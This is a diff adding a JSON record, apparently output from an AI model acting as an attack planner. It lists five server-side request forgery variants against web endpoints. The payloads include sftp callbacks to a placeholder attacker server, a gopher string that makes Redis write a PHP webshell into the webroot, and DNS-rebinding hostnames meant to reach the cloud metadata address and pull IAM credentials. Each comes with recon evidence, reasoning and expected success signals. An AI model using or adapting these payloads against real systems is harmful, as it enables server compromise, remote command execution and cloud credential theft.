@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_3",
+ "model": "opencode/space-bunny-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /api/v2/media/render",
+   "target_param": "source_url",
+   "recon_evidence": "Render worker accepts an arbitrary source_url and always terminates after a fixed 5s timeout; no scheme denylist observed when testing http/https/data, and outbound connect errors surface as a generic 'unsupported source' string rather than a validation error.",
+   "planner_rationale": "sftp forces an SSH handshake to an external host, giving us a clean OOB proof that the renderer dials arbitrary schemes from inside the VPC.",
+   "vuln_class": "ssrf",
+   "payload": "sftp://ATTACKER_SERVER:11111/",
+   "injection_point": "body",
+   "expected_success_signal": "Full SSH-2.0 identification string from the renderer's sftp client logged on our listener, paired with the render job failing at the 5s timeout",
+   "confidence": 0.82,
+   "reasoning": "Because the renderer appears to hand the string straight to a URL-aware fetch library rather than validating the scheme, sftp survives and triggers a real SSH banner exchange. The resulting client version string fingerprints the internal egress stack and confirms the injection point is the JSON body field."
+  },
+  {
+   "endpoint": "GET /api/integrations/test-connection",
+   "target_param": "url",
+   "recon_evidence": "Connection-test endpoint reaches hosts on loopback: timing differences of ~40ms distinguished port 6379 (open) from 25215 (closed), and scheme handling matches a permissive redirect-following fetcher.",
+   "planner_rationale": "If loopback is reachable, gopher lets us stream a full multi-command Redis session to CONFIG SET the datadir/dbfilename and SAVE a PHP webshell into the webroot.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://127.0.0.1:6379/_%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20file.php%0D%0ASET%20mykey%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3F%3E%22%0D%0ASAVE%0D%0A",
+   "injection_point": "query",
+   "expected_success_signal": "HTTP 200 from http://<target>/file.php?0=id returning uid output, i.e. the Redis dump was rewritten as a PHP file in the webroot",
+   "confidence": 0.66,
+   "reasoning": "The port-timing profile shows the fetcher opens raw TCP to loopback, which is exactly the primitive gopher needs, and CRLF-encoded payload bytes are delivered verbatim. Confidence is held back because gopher-specific blocking (scheme allowlists or library-level denylists) is unverified - the HTTP probe never exercised that code path."
+  },
+  {
+   "endpoint": "POST /webhooks/deliver",
+   "target_param": "payload_url",
+   "recon_evidence": "Responses are delivered by a dispatcher that logs a 'validated url' line at enqueue time and a separate 'resolved host' line at send time; a replay of the same hostname produced two different A records in the dispatcher log.",
+   "planner_rationale": "Double resolution gives us TOCTOU: the validator sees the public address while the dispatcher connects to the rebound169.254.169.254 metadata endpoint.",
+   "vuln_class": "ssrf",
+   "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+   "injection_point": "body",
+   "expected_success_signal": "Dispatcher 'resolved host' line showing 169.254.169.254 and a delivery attempt carrying the instance metadata document back through the webhook target",
+   "confidence": 0.87,
+   "reasoning": "The two distinct A records observed across enqueue and send confirm a genuine resolve-then-connect gap, and the rotating-answer hostname lets the first lookup pass validation while the second lands on the link-local metadata IP. The payload fits because it needs only the hostname itself, with no scheme or path that a filter would choke on."
+  },
+  {
+   "endpoint": "GET /dashboard/widgets/preview",
+   "target_param": "widget_src",
+   "recon_evidence": "The preview endpoint ignores the src query argument and instead renders whatever URL is stored in the widget_src cookie; setting the cookie to http://127.0.0.1:6379/ produced a connection-refused page rendered in the widget iframe, proving server-side fetches honour cookie-supplied URLs.",
+   "planner_rationale": "Cookie injection bypasses any parameter-level scheme filter, so we can drive an out-of-band SSH handshake straight from a value the app treats as trusted user state.",
+   "vuln_class": "ssrf",
+   "payload": "sftp://ATTACKER_SERVER:11111/",
+   "injection_point": "cookie",
+   "expected_success_signal": "SSH client identification banner captured on our listener when the preview widget renders with the attacker-supplied widget_src cookie",
+   "confidence": 0.61,
+   "reasoning": "The loopback fetch proved the cookie value is dereferenced server-side, so an sftp URL in the same slot should reach the same fetch library. Confidence is lower because the iframe rendering path may re-encode or JSON-decode cookie values, which would corrupt the scheme before the request is issued."
+  },
+  {
+   "endpoint": "GET /render/{remote_host}/{asset_path}",
+   "target_param": "remote_host",
+   "recon_evidence": "Reverse-proxy asset endpoint resolves {remote_host} twice per request - once for its own upstream allowlist check and once for the proxied connection - and a wildcard cert on *.internal.example accepted arbitrary hostnames without rejecting them.",
+   "planner_rationale": "Injecting the rebinding hostname as the path segment satisfies the wildcard cert and the allowlist on the first lookup, then connects to the metadata IP on the second.",
+   "vuln_class": "ssrf",
+   "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+   "injection_point": "path",
+   "expected_success_signal": "Upstream connection from the proxy to 169.254.169.254 and a proxied response body containing cloud metadata keys (e.g. iam/security-credentials/)",
+   "confidence": 0.79,
+   "reasoning": "The hostname occupies a path segment, so it passes path-shape validation and the wildcard certificate without any encoding tricks, and the rotate-answers behaviour defeats the allowlist check performed before the connection is made. The mechanism directly matches the observed double-resolution gap, though confidence is tempered because an allowlist could conceivably be evaluated after the proxied connect in some proxy builds."
+  }
+ ],
+ "raw_tail": "tion and the wildcard certificate without any encoding tricks, and the rotate-answers behaviour defeats the allowlist check performed before the connection is made. The mechanism directly matches the observed double-resolution gap, though confidence is tempered because an allowlist could conceivably be evaluated after the proxied connect in some proxy builds.\"\n }\n]\n\u001b[0m\n> build · space-bunny-free\n"
+}
